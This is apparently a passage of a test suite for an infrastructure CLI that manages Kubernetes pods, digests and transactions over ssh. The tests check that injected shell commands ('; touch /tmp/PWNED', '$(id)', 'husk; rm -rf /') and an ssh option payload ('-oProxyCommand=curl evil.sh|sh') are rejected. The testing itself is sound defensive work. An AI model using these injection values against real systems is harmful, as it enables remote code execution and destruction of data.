        "--digest",
        DIGEST,
        "--repos",
        "lawz",
      ],
      "discard-unprepared-transaction": [
        "discard-unprepared-transaction",
        "--role",
        "research-runner",
      ],
      "sweep-evicted-pods": ["sweep-evicted-pods"],
    }[verb];
    const code = runCli([...argv, "--yes", "--dry-run"], {
      ...silent(),
      logDir: mkdtempSync(path.join(tmpdir(), "infra-both-")),
      ssh,
      gh,
      kubectlPods,
      deploymentResourceVersion: () => "4547129",
      now: () => NOW,
    });
    return { code, ssh, gh, kubectlPods };
  };

  for (const verb of [
    "rotate-driver-digest",
    "discard-unprepared-transaction",
    "sweep-evicted-pods",
  ]) {
    test(`${verb} --yes --dry-run refuses and calls nothing`, () => {
      const { code, ssh, gh, kubectlPods } = injected(verb);
      expect(code).toBe(EXIT.CANNOT_EVALUATE);
      expect(ssh.calls).toHaveLength(0);
      expect(gh.calls).toHaveLength(0);
      expect(kubectlPods.calls).toHaveLength(0);
    });
  }

  test("the refusal says which flags disagree", () => {
    const cap = capture();
    runCli(["sweep-evicted-pods", "--yes", "--dry-run"], {
      ...cap,
      logDir: mkdtempSync(path.join(tmpdir(), "infra-both-")),
      ssh: recorder(() => ok()),
      kubectlPods: recorder(() => ok(JSON.stringify({ items: [] }))),
      now: () => NOW,
    });
    expect(cap.text()).toContain("contradictory flags");
    expect(cap.text()).toContain("--yes");
    expect(cap.text()).toContain("--dry-run");
  });

  test("neither flag alone is affected", () => {
    const deps = () => ({
      ...silent(),
      logDir: mkdtempSync(path.join(tmpdir(), "infra-one-")),
      ssh: recorder(() => ok()),
      kubectlPods: recorder(() => ok(JSON.stringify({ items: [] }))),
      now: () => NOW,
    });
    expect(runCli(["sweep-evicted-pods", "--yes"], deps())).toBe(EXIT.OK);
    expect(runCli(["sweep-evicted-pods", "--dry-run"], deps())).toBe(EXIT.OK);
  });
});

describe("host-read values are inputs too", () => {
  const base = {
    dirExists: true,
    promotionState: false,
    coordinatorPhase: false,
    patch: [
      { op: "test", path: "/metadata/resourceVersion", value: "4547129" },
    ],
    target: "legal-research-dev/legal-research-broker",
    liveResourceVersion: "4547129",
    binding: `sha256:${"a".repeat(64)}`,
  };

  test("a binding with a shell metacharacter is CANNOT EVALUATE", () => {
    for (const binding of [
      `sha256:${"a".repeat(64)}; touch /tmp/PWNED`,
      "$(id)",
      "sha256:nothex",
      `SHA256:${"A".repeat(64)}`,
    ]) {
      const v = evaluateDiscard({
        role: "research-runner",
        probe: { ...base, binding },
      });
      expect(v.ok).toBe(false);
      expect(v.exitCode).toBe(EXIT.CANNOT_EVALUATE);
    }
  });

  test("the verb stops at the probe when the binding is not a sha256", () => {
    const ssh = recorder(() =>
      ok(
        JSON.stringify({
          dirExists: true,
          promotionState: false,
          coordinatorPhase: false,
          patch: [
            { op: "test", path: "/metadata/resourceVersion", value: "4547129" },
          ],
          target: {
            namespace: "legal-research-dev",
            name: "legal-research-broker",
          },
          binding: `sha256:${"a".repeat(64)}; touch /tmp/PWNED`,
          entries: ["qualification-stage.binding"],
          exchange: [],
        }),
      ),
    );
    const result = discardUnpreparedTransaction(
      { role: "research-runner", yes: true },
      { ssh, deploymentResourceVersion: () => "4547129", ...silent() },
    );
    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
    // Only the probe. The act script — which would have put that string on a
    // sudo command line — was never built.
    expect(ssh.calls).toHaveLength(1);
  });

  test("a legitimate binding is single-quoted on the sudo line", () => {
    const binding = `sha256:${"a".repeat(64)}`;
    const script = discardActScript("research-runner", {
      binding,
      candidateRole: "research_runner",
      target: {
        namespace: "legal-research-dev",
        name: "legal-research-broker",
      },
      resourceVersion: "4547129",
    });
    expect(script).toContain(`--recover '${binding}'`);
  });

  test("a live-deployment.json naming something unshaped never reaches kubectl", () => {
    const rv = recorder(() => "4547129");
    const ssh = recorder(() =>
      ok(
        JSON.stringify({
          dirExists: true,
          promotionState: false,
          coordinatorPhase: false,
          patch: [
            { op: "test", path: "/metadata/resourceVersion", value: "4547129" },
          ],
          target: { namespace: "legal-research-dev", name: "broker; id" },
          binding: `sha256:${"a".repeat(64)}`,
          entries: [],
          exchange: [],
        }),
      ),
    );
    const result = discardUnpreparedTransaction(
      { role: "research-runner", yes: true },
      { ssh, deploymentResourceVersion: rv, ...silent() },
    );
    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
    expect(rv.calls).toHaveLength(0);
  });

  test("a pod the cluster could not have named is kept, not deleted", () => {
    const { selected, skipped } = selectEvictedPods(
      [pod({ name: "husk; rm -rf /", owners: rs("u") })],
      { patterns: splitList(DEFAULT_NAMESPACES), nowMs: NOW },
    );
    expect(selected).toHaveLength(0);
    expect(skipped[0].why).toContain("RFC 1123");
  });
});

describe("--repos is an allow-list", () => {
  const cliDeps = () => ({
    ...silent(),
    logDir: mkdtempSync(path.join(tmpdir(), "infra-repos-")),
    now: () => NOW,
  });

  test("only legalease and lawz resolve", () => {
    expect(resolveDriverDigestRepo("legalease")).toBe("watt-mind/legalease");
    expect(resolveDriverDigestRepo("watt-mind/lawz")).toBe("watt-mind/lawz");
    expect(resolveDriverDigestRepo("factory")).toBe(null);
    expect(resolveDriverDigestRepo("someone-else/legalease")).toBe(null);
    expect(resolveDriverDigestRepo("")).toBe(null);
    expect(DRIVER_DIGEST_REPOS.map((r) => r.slug)).toEqual([
      "watt-mind/legalease",
      "watt-mind/lawz",
    ]);
  });

  test("a repo off the list is exit 3 without touching the host or gh", () => {
    const ssh = recorder(() => ok(digestProbeOut(DIGEST, DIGEST)));
    const gh = recorder(() => ok());
    const code = runCli(
      [
        "rotate-driver-digest",
        "--digest",
        DIGEST,
        "--repos",
        "legalease,watt-mind/infra-secrets",
        "--yes",
      ],
      { ...cliDeps(), ssh, gh },
    );
    expect(code).toBe(EXIT.CANNOT_EVALUATE);
    expect(ssh.calls).toHaveLength(0);
    expect(gh.calls).toHaveLength(0);
  });

  test("a mid-loop gh failure names the repos already rotated", () => {
    let writes = 0;
    const gh = recorder((args) => {
      if (args[1] === "get") return ok(OTHER);
      writes += 1;
      return writes === 1 ? ok() : fail("HTTP 403");
    });
    const cap = capture();
    const result = rotateDriverDigest(
      { digest: DIGEST, repos: ["legalease", "lawz"], yes: true },
      { ssh: recorder(() => ok(digestProbeOut(DIGEST, DIGEST))), gh, ...cap },
    );
    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
    expect(result.actions).toBe(1);
    expect(cap.text()).toContain("already rotated");
    expect(cap.text()).toContain("watt-mind/legalease");
    expect(cap.text()).toContain("watt-mind/lawz");
  });
});

describe("--host is an ssh destination, not an option", () => {
  test("HOST_RE takes plain destinations and refuses ssh options", () => {
    for (const good of [
      "hdkiller@100.74.142.98",
      "runner",
      "runner.internal.example.com",
      "user@fd00::1",
      "10.0.0.1",
    ]) {
      expect(HOST_RE.test(good)).toBe(true);
    }
    for (const bad of [
      "-oProxyCommand=curl evil.sh|sh",
      "-lroot",
      "--",
      "host; touch /tmp/PWNED",
      "host $(id)",
      "a b",
      "",
    ]) {
      expect(HOST_RE.test(bad)).toBe(false);
    }
  });

  test("an option-shaped --host is exit 3 before any adapter runs", () => {
    const ssh = recorder(() => ok());
    const kubectlPods = recorder(() => ok(JSON.stringify({ items: [] })));
    const code = runCli(
      [
        "sweep-evicted-pods",
        "--host",
        "-oProxyCommand=curl evil.sh|sh",
        "--yes",
      ],
      {
        ...silent(),
        logDir: mkdtempSync(path.join(tmpdir(), "infra-host-")),
        ssh,
        kubectlPods,
        now: () => NOW,
      },
    );
    expect(code).toBe(EXIT.CANNOT_EVALUATE);
    expect(ssh.calls).toHaveLength(0);
    expect(kubectlPods.calls).toHaveLength(0);
  });

  test("defaultSsh refuses a bad destination instead of spawning it", () => {
    const run = defaultSsh("-oProxyCommand=id", "echo hi\n");
    expect(run.status).not.toBe(0);
    expect(run.stderr).toContain("refusing to ssh");
  });
});

describe("the act script cannot lose a completed discard", () => {
  const script = () =>
    discardActScript("research-runner", {
      binding: `sha256:${"a".repeat(64)}`,
      candidateRole: "research_runner",
      target: {
        namespace: "legal-research-dev",
        name: "legal-research-broker",
      },
      resourceVersion: "4547129",
    });

  test("errexit is never enabled, and the tail is best-effort", () => {
    const s = script();
    // The bug: `set -e` was restored before the removal, so a failing fsync or
    // journal tail afterwards made the caller report "CANNOT EVALUATE —
    // actions: 0" about a directory that was already gone.
    expect(s).not.toContain("\nset -e\n");
    expect(s).toContain(DISCARD_POINT_OF_NO_RETURN);
    const [before, after] = s.split(DISCARD_POINT_OF_NO_RETURN);
    expect(before).toContain('rm -rf "$DIR"');
    expect(after.trimEnd().endsWith("exit 0")).toBe(true);
    expect(after).toContain("WARNING");
  });

  test("the post-removal tail exits 0 even when every step fails", () => {
    // Run the real epilogue under bash with `python3` and `sudo` replaced by
    // failures. Under errexit — the pre-fix state of this script — the first
    // failure would take the whole discard's exit status with it.
    const shim = mkdtempSync(path.join(tmpdir(), "infra-shim-"));
    for (const name of ["python3", "sudo"]) {
      const file = path.join(shim, name);
      writeFileSync(file, "#!/bin/sh\nexit 7\n");
      chmodSync(file, 0o755);
    }
    const epilogue = script().split(DISCARD_POINT_OF_NO_RETURN)[1];
    const run = spawnSync("bash", ["-c", `set -euo pipefail\n${epilogue}`], {
      encoding: "utf8",
      env: { ...process.env, PATH: `${shim}:${process.env.PATH}` },
    });
    expect(run.status).toBe(0);
    expect(run.stdout).toContain("WARNING: fsync");
    expect(run.stdout).toContain("WARNING: journal tail failed");
    expect(run.stdout).toContain("exit 7");
  });
});

describe("a sweep that deleted nothing is not a clean sweep", () => {
  test("every delete failing is CANNOT EVALUATE, not OK", () => {
    const ssh = recorder(() => fail("Unauthorized"));
    const kubectlPods = recorder(() =>
      ok(
        JSON.stringify({
          items: [
            pod({ name: "husk-a", owners: rs("u") }),
            pod({ name: "husk-b", owners: rs("u") }),
            pod({
              name: "live",
              phase: "Running",
              reason: null,
              owners: rs("u"),
            }),
          ],
        }),
      ),
    );
    const cap = capture();
    const result = sweepEvictedPods(
      { yes: true },
      { ssh, kubectlPods, now: () => NOW, ...cap },
    );
    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
    expect(result.actions).toBe(0);
    expect(ssh.calls).toHaveLength(2);
    expect(cap.text()).toContain("all 2 delete(s) failed");
  });

  test("selecting nothing at all is still a clean exit 0", () => {
    const result = sweepEvictedPods(
      { yes: true },
      {
        ssh: recorder(() => fail("Unauthorized")),
        kubectlPods: recorder(() => ok(JSON.stringify({ items: [] }))),
        now: () => NOW,
        ...silent(),
      },
    );
    expect(result.exitCode).toBe(EXIT.OK);
    expect(result.actions).toBe(0);
  });
});

describe("the log directory is not world-readable", () => {
  test("makeLogger creates it 0700", () => {
    const dir = path.join(
      mkdtempSync(path.join(tmpdir(), "infra-mode-")),
      "logs",
    );
    makeLogger("sweep-evicted-pods", { nowMs: NOW, logDir: dir });
    // It records which host was touched and what was removed from it.
    expect(statSync(dir).mode & 0o777).toBe(0o700);
  });
});
